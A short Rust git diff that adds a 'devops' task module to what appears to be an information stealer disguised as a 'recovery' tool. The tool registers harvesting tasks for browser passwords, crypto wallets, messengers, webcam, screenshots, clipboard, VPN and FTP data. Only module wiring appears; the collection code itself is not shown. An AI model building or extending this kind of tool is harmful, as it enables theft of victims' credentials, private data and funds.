@@ -10,9 +10,9 @@ use recovery::structured::{
 };
 use recovery::task::{RecoveryError, RecoveryOutcome};
 use recovery::{
-    RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, file_recovery,
-    ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, screenshot, services, system,
-    vpn, wallet, webcam,
+    RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, devops,
+    file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, screenshot,
+    services, system, vpn, wallet, webcam,
 };
 use tracing_subscriber::prelude::*;
 use tracing_subscriber::{EnvFilter, fmt};
@@ -82,6 +82,7 @@ async fn main() -> Result<(), RecoveryError> {
     manager.register_task(wallet_inventory_task(&context));
     manager.register_tasks(messenger::messenger_tasks(&context));
     manager.register_tasks(other::other_tasks(&context));
+    manager.register_tasks(devops::devops_tasks(&context));
     manager.register_tasks(wallet::wallet_tasks(&context));
     manager.register_tasks(vpn::vpn_tasks(&context));
     let outcomes = manager.run_all().await?;
